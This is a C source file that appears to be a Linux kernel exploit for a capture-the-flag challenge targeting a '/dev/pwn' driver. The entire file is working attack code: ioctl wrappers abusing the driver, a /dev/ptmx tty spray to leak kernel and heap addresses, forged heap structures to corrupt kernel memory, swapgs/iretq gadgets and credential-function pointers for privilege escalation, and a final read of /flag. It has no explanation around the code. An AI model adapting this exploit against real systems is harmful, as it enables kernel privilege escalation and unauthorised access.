/*
 * main.c
 * Copyright (C) 2019 hzshang <hzshang15@gmail.com>
 *
 * Distributed under terms of the MIT license.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <poll.h>
#include <pthread.h>
#include <errno.h>
#include <stdlib.h>
#include <signal.h>
#include <string.h>
#include <sys/syscall.h>
#include <pthread.h>
#include <poll.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <pthread.h>
#define ADDRESS 0xdead0000

typedef uint64_t u64;
struct io_ {
    uint64_t size;
    struct {
        uint8_t* ptr;
        uint64_t size;
    } pool[0x10];
    uint64_t idx;
};

typedef struct io_ io;
typedef struct cio_ cio;
int fd;
void add(uint64_t size,uint8_t *data){
    io x;
    x.size = 1;
    x.pool[0].ptr = data;
    x.pool[0].size = size;
    ioctl(fd,6,&x);
}
void show(uint8_t* dst,uint64_t idx,uint64_t size){
    io x;
    x.idx = idx;
    x.size = 1;
    x.pool[0].ptr = dst;
    x.pool[0].size = size;
    ioctl(fd,66,&x);
}
void edit(uint8_t *src,uint64_t idx,uint64_t size){
    io x;
    x.idx = idx;
    x.size = 1;
    x.pool[0].ptr = src;
    x.pool[0].size = size;
    ioctl(fd,666,&x);
}
void dele(uint64_t idx){
    uint64_t x = idx;
    ioctl(fd,6666,&x);
}
void print_buf(u64* buf,int length){
    for(int i = 0;i<length-1;i+=2){
        printf("0x%02x:0x%016lx\t0x%016lx\n",8*i,buf[i],buf[i+1]);
    }
    if(length%2)
        printf("0x%02x:0x%016lx\n",length-1,buf[length-1]);
}
#define SIZE 0x3f0
uint64_t kernel_base = 0;
uint64_t heap_base = 0;
uint64_t (*prepare_creds)(int);
void (*commits_creds)(uint64_t);
void shell(){
    printf("done!\n");
    system("sh");
}
extern void* set_reg;
extern void* swap;
extern void* loop_me;
asm(
        "set_reg:\n"
        "mov %rax,%rdi\n"
        "ret\n"
        "swap:\n"
        "swapgs\n"
        "iretq\n"
        "loop_me:\n"
        "jmp loop_me\n"
   );
size_t user_cs, user_ss,user_rflags, user_sp ,user_gs,user_es,user_fs,user_ds;

void save_status(){
    puts("[*] status saving");
    __asm__("mov %%cs, %0\n"
            "mov %%ss,%1\n"
            "mov %%rsp,%2\n"
            "pushfq\n"
            "pop %3\n"
            "mov %%gs,%4\n"
            "mov %%es,%5\n"
            "mov %%fs,%6\n"
            "mov %%ds,%7\n"
            ::"m"(user_cs),"m"(user_ss),"m"(user_sp),"m"(user_rflags),
            "m"(user_gs),"m"(user_es),"m"(user_fs),"m"(user_ds)
           );
    puts("[*]status has been saved.");
}
void stub(){
    while(1);
}

int main(int argc, char *argv[]){

    save_status();
    fd = open("/dev/pwn",0);
    uint64_t buf[SIZE/8];
    uint64_t reset_stack;
    memset(buf,'x',SIZE);
    for(int i=0;i<0x4;i++)
        add(SIZE,buf);
    for(int i=0;i<0x4;i++)
        edit(0xdeadbeef,i,SIZE);
    printf("done!\n");

    int ptmx_fd = open("/dev/ptmx",O_RDWR|O_NOCTTY);
    int idx,pid;
    for(idx=0;idx<8;idx++){
        show(buf,idx,sizeof(buf));
        print_buf(buf,SIZE/8);
        if(buf[0] == 0x0000000100005401){
            printf("find victim:%d\n",idx);
            kernel_base = buf[3]-0x10a3700;
            heap_base = buf[7]-0x38;
            printf("base:%lx\n",kernel_base);
            printf("heap:%lx\n",heap_base);
            goto fuck;
            break;
        }
    }
    exit(0);
fuck:
    close(ptmx_fd);
    for(int i=0;i<0x4;i++){
        add(8,buf);
    }
    for(int i=4;i<0x8;i++){
        edit(0xdeadbeef,i,8);
    }
    for(int i=8;i<0x10;i++){
        add(0x230,buf);
    }
    buf[0] = 0xb9a00 + kernel_base;
    for(int i=4;i<8;i++){
        edit(buf,i,8);
    }
    memset(buf,0,sizeof(buf));
    buf[0] = 0x245;
    buf[6] = 0x3fffffffff;
    buf[7] = 0x3fffffffff;
    buf[8] = 0x3fffffffff;
    buf[9] = 0;
    buf[10] = 1;
    buf[15] = heap_base + 0x100;
    buf[16] = kernel_base + 0x1654000;
    buf[17] = kernel_base + 0x16540a0;
    buf[18] = kernel_base + 0x165b488;

    buf[0x20] = 0x55;
    buf[0x21] = heap_base + 0x108;
    buf[0x26] = heap_base + 0x150;
    buf[0x27] = heap_base + 0x190;
    buf[0x28] = 0x000000000000029a;
    buf[0x29] = 0x0000000100000001;
    buf[0x3a] = heap_base + 0x1e0;
    buf[0x150/8] = heap_base + 0x200;
    buf[0x158/8] = heap_base + 0x100;
    buf[0x190/8] = 0x746f6f72;
    buf[0x1e0/8] = heap_base;
    buf[0x1e8/8] = heap_base;
    buf[0x1f0/8] = heap_base;
    buf[0x1f8/8] = heap_base;
    buf[0x200/8] = heap_base;

    //    buf[0x130/8] = heap_base + 0x150;
    //    buf[0x130/8] =
    for(int i=8;i<0x10;i++){
        edit(buf,i,0x230);
    }
    getchar();

    dele(8);
    int fd = open("/flag",0);
    read(fd,buf,0x100);
    write(1,buf,0x100);
    return 0;
}



